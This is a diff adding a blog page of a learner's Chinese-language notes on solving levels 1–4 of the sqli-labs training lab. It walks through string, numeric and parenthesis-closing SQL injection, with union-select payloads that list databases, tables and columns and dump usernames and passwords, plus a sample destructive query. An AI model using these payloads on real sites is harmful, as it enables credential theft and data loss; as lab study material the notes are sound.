@@ -1,0 +1,726 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="注入的基本操作(字符型、数字型、优先匹配、强制字符转换), sqli_labs1-4关 1个菜b学sql注入的笔记，大佬绕过 前置知识: 10以内加减法、mysql语法，建议去w3school 俺第一次学的时候感觉进步很慢，很难，然后就咕咕了，后来发现还是要先打好基础，后面会简单一些 由于没学过数据库，0基础fw,所以前面水的比较多，后面就8废话了 另外，信安日记这篇讲得8错，很通俗，阔以对照着看">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli_lab 解题笔记(1)">
+<meta property="og:url" content="http://example.com/2021/10/27/sqli-labs-%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0-1/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="注入的基本操作(字符型、数字型、优先匹配、强制字符转换), sqli_labs1-4关 1个菜b学sql注入的笔记，大佬绕过 前置知识: 10以内加减法、mysql语法，建议去w3school 俺第一次学的时候感觉进步很慢，很难，然后就咕咕了，后来发现还是要先打好基础，后面会简单一些 由于没学过数据库，0基础fw,所以前面水的比较多，后面就8废话了 另外，信安日记这篇讲得8错，很通俗，阔以对照着看">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/sqli_labs/sqli_labs.png">
+<meta property="article:published_time" content="2021-10-27T11:32:55.000Z">
+<meta property="article:modified_time" content="2024-03-11T18:12:07.250Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/sqli_labs/sqli_labs.png">
+  
+  
+  
+  <title>sqli_lab 解题笔记(1) - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="sqli_lab 解题笔记(1)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-10-27 19:32" pubdate>
+          October 27, 2021 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">sqli_lab 解题笔记(1)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>注入的基本操作(字符型、数字型、优先匹配、强制字符转换), sqli_labs1-4关</p>
+<p>1个菜b学sql注入的笔记，大佬绕过</p>
+<p>前置知识: 10以内加减法、mysql语法，建议去<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/">w3school</a></p>
+<p>俺第一次学的时候感觉进步很慢，很难，然后就咕咕了，后来发现还是要先打好基础，后面会简单一些</p>
+<p>由于没学过数据库，0基础fw,所以前面水的比较多，后面就8废话了</p>
+<p>另外，<a target="_blank" rel="noopener" href="https://blog.51cto.com/skytina/1698724">信安日记</a>这篇讲得8错，很通俗，阔以对照着看</p>
+<p>SQL注入原理，虽然简单，还是再叙述一下, 大致就是你传进1个参，然后服务器会执行php文件的命令，然后你就阔以在传参上做点手脚</p>
+<p>比如这个php文件里有这样1个命令:<br>$sql&#x3D;”SELECT * FROM users WHERE id&#x3D;’$id’ LIMIT 0,1”;(其中$sql就是你传的参)<br>如果传入&#x2F;?id&#x3D;-1’ DELETE database() – ，原语句就变意思了，服务器就会识别成删库语句，然后就…</p>
+<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="关于database、schema、table等的关系"><a href="#关于database、schema、table等的关系" class="headerlink" title="关于database、schema、table等的关系"></a>关于database、schema、table等的关系</h2><p>database是个旅馆，schema是房间，table是床，users有的可以操作schema(eg:房客)，有的可以操作database(eg:老鸨)</p>
+<h3 id="优先匹配"><a href="#优先匹配" class="headerlink" title="优先匹配"></a>优先匹配</h3><p>在where语句中，当出现多个字符串的时候，“&#x3D;”将会选择优先级最高的一个，优先级是从左到右，依次降低的！也就是离“&#x3D;”最近的一个。<br>eg:</p>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> user_id = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>;<br></code></pre></td></tr></table></figure>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> user_id = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;shit&#x27;</span>;<br></code></pre></td></tr></table></figure>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> user_id = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;shit&#x27;</span><span class="hljs-string">&#x27;qnmd&#x27;</span>;<br></code></pre></td></tr></table></figure>
+<p>以上查询结果都一样，等同于只输1个’1’</p>
+<h3 id="concat家族"><a href="#concat家族" class="headerlink" title="concat家族"></a>concat家族</h3><h4 id="concat"><a href="#concat" class="headerlink" title="concat()"></a>concat()</h4><p>concat(column1,column2):将column1, column2联合显示</p>
+<h4 id="concat-ws"><a href="#concat-ws" class="headerlink" title="concat_ws:"></a>concat_ws:</h4><p>CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符</p>
+<h4 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat():"></a>group_concat():</h4><p>要知道这个，得知道GROUP BY，见下面</p>
+<p>然后回到group_concat()，它就是将GROUP BY产生的分组里的字符~~~拼~~~连接，作为1个字符返回</p>
+<h4 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h4><p>一般和GROUP_CONCAT混用，用于数据分组</p>
+<p><img src="/images/sqli_labs/sqli_labs(9).png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h3><p>很牛逼的数据库，相当于新华字典，里面存着数据库名字等关键信息<br>m0r3:<br>information_schema下的表:<br>    schemata:(schema_data缩写)提供所有数据库信息，里面有schema_name</p>
+<pre><code class="hljs">tables:table_name,所有表名; table_schema:所有表所在数据库名称
+eg: select group_concat(table_name) from information_schema.tables where table_schema=&#39;qnmd&#39;-- (找&#39;qnmd&#39;数据库下的所有表)
+
+columns:提供表中的列信息，其中有个叫colums_name的列，提供所有表里有啥列，还有table_name,常用于限定查哪个表(此处的table_name和tables里的table_name好像还8一样，姑且不研究太深)
+eg: select group_concat(column_name) from information_schema.columns where table_name=&#39;shit&#39;-- (找&#39;shit&#39;表里的所有列名)
+
+其他的8太需要了解
+</code></pre>
+<h1 id="lesson-1-字符型注入"><a href="#lesson-1-字符型注入" class="headerlink" title="lesson_1 字符型注入"></a>lesson_1 字符型注入</h1><h2 id="1、判断类型"><a href="#1、判断类型" class="headerlink" title="1、判断类型"></a>1、判断类型</h2><p>?id&#x3D;1 and 1&#x3D;2– ,返回正常，所以8是数字型注入<br>?id&#x3D;1’ ,加单引号，发现报错，加– 注释，显示正常，说明是单引号注入;</p>
+<h2 id="分析字段数-判断该表有几列数据"><a href="#分析字段数-判断该表有几列数据" class="headerlink" title="分析字段数(判断该表有几列数据)"></a>分析字段数(判断该表有几列数据)</h2><p>为啥要分析呢？因为后面UNION SELECT要用到</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; order <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure>
+<p>回显正常，?id&#x3D;1’ order by 4– ，回显错误，说明有3列</p>
+<h2 id="看看页面有没有显示位"><a href="#看看页面有没有显示位" class="headerlink" title="看看页面有没有显示位"></a>看看页面有没有显示位</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=-<span class="hljs-number">1</span>&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure>
+<p>结果:<br>Welcome    Dhakkan<br>Your Login name:2<br>Your Password:3 </p>
+<p>说明有2个显示位(有时，SELECT语句会限制输出的行数(比如SELECT * FROM users WHERE id&#x3D;’$id’ LIMIT 0,1)，这时候就需要让第一行失效)</p>
+<h2 id="找出数据库名，表名、列名"><a href="#找出数据库名，表名、列名" class="headerlink" title="找出数据库名，表名、列名"></a>找出数据库名，表名、列名</h2><p>将id&#x3D;1改成数据库8存在的值，这样显示的时候便不占用显示位(原理:因为没有，所以8会显示)</p>
+<p>?id&#x3D;qnmd’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –<br>来手逐字解析，比较0基础</p>
+<p>GROUP_CONCAT, schema_name, schema_name：见上文<br>indormation.schemata: 加information_schema是因为schemata在当前数据库没有，而是在information_schema里，要先换到另一个数据库<br>tips: GROUP_CONCAT此处后面没有GROUP BY，所以是直接将所有的列打包到一块，作为1个字符串，结果显示:emails,referers,uagents,users，若不加GROUP_CONCAT()则只显示emails</p>
+<h1 id="lesson-2-数字型注入"><a href="#lesson-2-数字型注入" class="headerlink" title="lesson_2 数字型注入"></a>lesson_2 数字型注入</h1><p>众所周知，数字型注入也是个基本注入类型</p>
+<h2 id="判断是否是数字型"><a href="#判断是否是数字型" class="headerlink" title="判断是否是数字型"></a>判断是否是数字型</h2><p>只需要通过简单的加减法就阔以判断啦!(此处注意，在url码里+是空格，所以要用%2B表示+)</p>
+<p>首先输入&#x2F;?id&#x3D;1’，显示错误，但是当输入&#x2F;?id&#x3D;1’– 时仍然错误，然后注意此处返回的报错:<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1<br>而不是:<br>Unknown column ‘1’’ in ‘where clause’<br>所以说明这里的’并没有被php里的某些防护函数转义(相关知识见下方)</p>
+<p>然后输入&#x2F;?id&#x3D;1+1，返回结果和&#x2F;?id&#x3D;2一样，就阔以说明是数字型注入了</p>
+<p>数字型注入和字符型的区别8大，不需要用’闭合就是了，略</p>
+<h3 id="tips-小提一下php里的一些转义函数"><a href="#tips-小提一下php里的一些转义函数" class="headerlink" title="tips, 小提一下php里的一些转义函数"></a>tips, 小提一下php里的一些转义函数</h3><p>有时候php里的一些函数在传入的参里有’,”,&#x2F;等字符时，会在其前面自动补’&#x2F;‘对1其转义，防止sql注入</p>
+<h1 id="lesson-3-需要闭合括号的注入"><a href="#lesson-3-需要闭合括号的注入" class="headerlink" title="lesson_3 需要闭合括号的注入"></a>lesson_3 需要闭合括号的注入</h1><p>首先构造闭合单引&#x2F;?id&#x3D;1’，返回报错: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’) LIMIT 0,1’ at line 1<br>发现了一个奇怪的’(‘，搜索得知，这是个需要闭合括号的注入, 查看php源码发现它的指令如下:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">$<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>(<span class="hljs-string">&#x27;$id&#x27;</span>);<br></code></pre></td></tr></table></figure>
+<p>而我们之前注入的php源码则是这样:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$sql</span> = select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> user </span>where <span class="hljs-attribute">id</span>=<span class="hljs-string">&#x27;$id&#x27;</span>;<br></code></pre></td></tr></table></figure>
+<p>所以加个’)’进行闭合就阔以啦!<br>实操，很ez</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;) union select 1,database(),user()</span><br><span class="hljs-string">?id=-1&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-keyword">user</span>() <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-comment">-- </span><br>?id=<span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,group_concat(column_name),user() from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; -- </span><br><span class="hljs-string">?id=-1&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username),group_concat(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users <span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/sqli_labs/sqli_labs(1).png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="数字型注入知识点"><a href="#数字型注入知识点" class="headerlink" title="数字型注入知识点"></a>数字型注入知识点</h1><h2 id="数字型和字符型的区别"><a href="#数字型和字符型的区别" class="headerlink" title="数字型和字符型的区别"></a>数字型和字符型的区别</h2><p>数字型传入的参数8是包裹在引号里的，传入的参会被转化为数字，比如传入id&#x3D;1+1，系统会查找id&#x3D;2的行</p>
+<p>其注入方法，除了8需要用’闭合外，和字符型注入差不多</p>
+<h2 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h2><p>php里的强制类型转换规则，和c可8大一样</p>
+<p>比如输入’shit’,’1shit’,’2shit’,若强制转换为数字, 会分别被转为: 0,1,2</p>
+<p>因为’shit’里，第一个字符8是数字，就会转化成0;’1shit’则会转化为1，忽略后面的非数字</p>
+<h2 id="在数字型注入想输入字符"><a href="#在数字型注入想输入字符" class="headerlink" title="在数字型注入想输入字符"></a>在数字型注入想输入字符</h2><p>2种方法</p>
+<h3 id="使用16进制"><a href="#使用16进制" class="headerlink" title="使用16进制"></a>使用16进制</h3><p>待填</p>
+<h3 id="使用char-函数"><a href="#使用char-函数" class="headerlink" title="使用char()函数"></a>使用char()函数</h3><p>待填</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/%E5%9F%BA%E7%A1%80/" class="category-chain-item">基础</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web/" class="print-no-link">#web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>sqli_lab 解题笔记(1)</div>
+      <div>http://example.com/2021/10/27/sqli-labs-解题笔记-1/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 27, 2021</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/10/29/sqli-labs-%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0-2/" title="sqli_labs 解题笔记(2)">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">sqli_labs 解题笔记(2)</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/10/15/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93/" title="源码泄露\信息搜集小总结">
+                        <span class="hidden-mobile">源码泄露\信息搜集小总结</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
